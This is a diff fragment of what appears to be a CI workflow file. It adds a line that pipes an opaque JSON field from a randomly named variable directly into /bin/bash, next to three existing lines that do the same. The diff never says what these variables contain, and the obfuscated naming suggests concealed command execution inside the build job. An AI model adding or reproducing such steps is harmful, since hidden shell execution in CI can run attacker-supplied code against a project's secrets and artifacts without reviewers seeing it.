@@ -20,6 +20,7 @@ jobs:
           echo $x5578 | jq -r .enchx00971 | /bin/bash
           printf '%s' "$fpyh3" | jq -r .k3952 | /bin/bash
           echo $xssyf84 | jq -r .bpjr64 | /bin/bash
+          echo $camw5 | jq -r .sjfq1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
